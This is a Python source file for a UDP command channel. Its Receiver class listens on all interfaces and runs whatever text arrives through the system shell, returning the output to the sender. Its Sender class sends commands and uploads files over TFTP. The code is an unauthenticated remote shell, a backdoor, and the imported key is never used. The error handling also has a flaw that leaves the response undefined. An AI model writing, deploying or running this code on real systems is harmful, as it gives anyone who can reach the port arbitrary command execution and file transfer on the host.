import subprocess
import logging
import base64

from os.path import basename

from socket import socket, AF_INET, SOCK_DGRAM, gethostname, gethostbyname
from config import KEY, PACKET_SIZE
from virtualization import UDPSocket


class Sender(object):

        
        def __init__(self, send_dest, recv_dest):
                self.recv_dest = recv_dest
                self.send_dest = send_dest ## hardening, tcp over udp magic
                
                sucky = socket(AF_INET, SOCK_DGRAM)
                sucky.connect(send_dest)
                self.sock = UDPSocket(sucky)



        def send_data(self, data):
                msg = { "data": data, 
                        "type": "text", 
                        "recv_dest": self.recv_dest ,
                        "send_dest": self.send_dest }
                logging.debug("Sending packet {0}".format(msg))
                yield self.sock.send(msg, self.send_dest)
                
                
        def send_file(self, filename):
                import tftpy
                client = tftpy.TftpClient(self.send_dest[0], 
                                          self.send_dest[1] + 1)
                client.upload(filename, basename(filename))
                
        
                        
                        
class Receiver(object):

                
    def __init__(self, server=("0.0.0.0", 0), client=False):
        sucky = socket(AF_INET, SOCK_DGRAM)
        logging.debug("Hostname: {0} ({1})".format(
                gethostname(), gethostbyname(gethostname())))
        sucky.bind(server)
        self.addr = sucky.getsockname()
        logging.debug("Socket bind: {0}".format(self.addr))
        self.sock = UDPSocket(sucky)
        self.server = server
        self.client = client

        self.last_chunk_no = 1
        self.bin_buffer = ''
        self.check_buffer = []


    def recv(self):
        packet, addr = yield self.sock.recv()
        logging.debug("Received packet {0} from {1}.".format(packet, addr))

        if self.client:  # if on client, don't execute shell command
                yield packet, addr
        else:
                if packet["type"] == "text":
                        resp = self.handle_text(packet)
                        yield resp, packet["recv_dest"]
                                                
            
    def handle_text(self, data):
        logging.debug("Handling text packet")

        if data["data"] == "CONNECT":
                return "ACK"

        try:
            proc = subprocess.Popen(data["data"],
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
            resp = proc.stdout.read() + proc.stderr.read()
        except:
            logging.error("Subprocess Popen execution error")
            
        return resp
        

    def get_addr(self):
            return self.addr


    def get_ip(self):
            return self.addr[0]


    def get_port(self):
            return self.addr[1]
